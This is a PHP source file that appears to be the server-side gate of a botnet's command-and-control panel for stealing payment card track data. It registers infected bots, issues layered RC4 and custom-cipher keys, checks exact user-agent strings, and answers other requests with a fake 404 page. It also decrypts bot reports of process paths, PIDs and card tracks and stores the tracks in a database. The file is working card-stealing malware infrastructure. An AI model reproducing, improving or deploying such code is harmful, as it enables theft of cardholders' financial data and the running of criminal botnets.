<?php
require_once("config.php");
require_once("crypt/rc4.php");
require_once("crypt/pirateCode.php");
require_once("common/commonFunctions.php");
require_once("common/dbOperations.php");

ini_set('display_errors', 1);
error_reporting(E_ALL ^ E_NOTICE);

date_default_timezone_set(TIMEZONE);

$connection = connectToDB(DBSERVER, DBUSER, DBPASSWORD, DATABASE);
if (!$connection)
	display404();

if (isset($_POST["id"]) && strlen($_POST["id"]) > 0){
	$id = filterString($_POST["id"]);
	$IP = getIP();
	$currTime = time();
	
	$query = executeQuery("SELECT levelOneRC4Key, levelTwoPirateCodeKey, levelThreeRC4Key, lastActive, tracksRecievedToday, tracksTotal FROM bots WHERE ID = '" . $id . "'");
	
	if ($query){ /* Bot has already been registered */
		$levelOneRC4Key = $query[0]["levelOneRC4Key"];
		$levelTwoPirateCodeKey = $query[0]["levelTwoPirateCodeKey"];
		$levelThreeRC4Key = $query[0]["levelThreeRC4Key"];
		
		$lastActive = $query[0]["lastActive"];
		if ($lastActive >= strtotime("today")) /* If it is still today */
			$tracksRecievedToday = $query[0]["tracksRecievedToday"];
		else
			$tracksRecievedToday = 0;
		$tracksTotal = $query[0]["tracksTotal"];
		
		$registered = true;
	} else { /* Bot has not been registered */
		$levelOneRC4Key = generateRandomMD5();
		$levelTwoPirateCodeKey = generateRandomMD5();
		$levelThreeRC4Key = generateRandomMD5();
		
		$lastActive = $currTime;
		$tracksRecievedToday = 0;
		$tracksTotal = 0;
		
		$registered = false;
	}	

	if ($registered && isset($_POST["report"]) && isset($_GET["report"]) && $_GET["report"] == "true" && $_SERVER["HTTP_USER_AGENT"] == "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"){
		//fwrite(fopen("log.txt", "a+"), PHP_EOL.$_POST["report"].PHP_EOL.PHP_EOL);
		$report = pirateCodeDecrypt($levelTwoPirateCodeKey, rc4($levelThreeRC4Key, $_POST["report"], true, false), false);
		
		$reportExploded = explode('|', filterString($report));
		$reportLength = count($reportExploded);
		$exePaths = array(); /* An array of exe paths indexed by their PIDs. I use this because I don't send two same exe paths in one batch. */
		for ($i=0; $i<$reportLength; $i++){
			if (strlen($reportExploded[$i])>0){
				$currReportExploded = explode(':', $reportExploded[$i]);
				
				if (strlen($currReportExploded[0]) > 0){
					$exePath = filterString(rc4($levelOneRC4Key, $currReportExploded[0], true, false));
					$exePaths[$currReportExploded[1]] = stripslashes($exePath);
					//fwrite(fopen("log.txt", "a+"), $currReportExploded[0]." = ".$exePath.PHP_EOL);
				} else
					$exePath = filterString($exePaths[$currReportExploded[1]]);
					
				$pid = filterString($currReportExploded[1]);
				$track = stripslashes(filterString(rc4($levelOneRC4Key, $currReportExploded[2], true, false)));
					
				/*echo "Exe path: ".$exePath.PHP_EOL;
				echo "PID: ".$pid.PHP_EOL;
				echo "Track: ".$track.PHP_EOL;*/
				
				if ($track[0] == 'B')
					$trackType = '1';
				else
					$trackType = '2';
				
				$query = executeQuery("SELECT exePath FROM tracks WHERE track = '" . $track . "'");
				if (!$query || trim(strtolower($query[0]["exePath"])) != trim(strtolower(stripslashes($exePath)))){ /* Track hasn't been recorded yet, add it to the DB. */
					$tracksRecievedToday ++;
					$tracksTotal ++;
					if ($query && strlen($query[0]["exePath"]) > 0 && trim(strtolower($query[0]["exePath"])) != trim(strtolower(stripslashes($exePath))))
						$track .= " (DIFFERENT EXE)";
					$query = executeQuery("INSERT INTO tracks (track, type, exePath, PID, botID, timeRecieved) VALUES ('" . $track . "', '" . $trackType . "', '" . $exePath . "', '" . $pid . "', '" . $id . "', '" . $currTime . "')");
				}
			}
		}

		echo "success";
	} else if (isset($_POST["request"]) && isset($_GET["request"]) && $_GET["request"] == "true"  && $_SERVER["HTTP_USER_AGENT"] == "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)"){
		if (isset($_POST["use"]) && isset($_POST["id"]) && isset($_GET["request"]) && $_GET["request"] == "true"/* && $_POST["id"] == "38efe070f0aed8c33f217a27850e42ba"*/){
			$request = rc4($_POST["use"], $_POST["request"], true, false);
			if (findString($request, "GETKEYS"))
				echo rc4($_POST["use"], pirateCodeEncrypt($_POST["use"], "success".':'.$levelOneRC4Key.':'.$levelTwoPirateCodeKey.':'.$levelThreeRC4Key, false), false, true);
			else
				display404();
		} else
			display404();
	} else
		display404();

	/* Update DB */
	if ($registered)
		$query = executeQuery("UPDATE bots SET IP = '" . $IP . "', lastActive = '" . $currTime . "', tracksRecievedToday = '" . $tracksRecievedToday . "', tracksTotal = '" . $tracksTotal . "' WHERE ID='" . $id . "'");
	else
		$query = executeQuery("INSERT INTO bots (ID, levelOneRC4Key, levelTwoPirateCodeKey, levelThreeRC4Key, IP, firstActive, lastActive, tracksRecievedToday, tracksTotal) VALUES ('" . $id . "', '" . $levelOneRC4Key . "', '" . $levelTwoPirateCodeKey . "', '" . $levelThreeRC4Key . "', '" . $IP . "', '" . $currTime . "', '" . $lastActive . "', '" . $tracksRecievedToday . "', '" . $tracksTotal . "')");
} else
	display404();
?>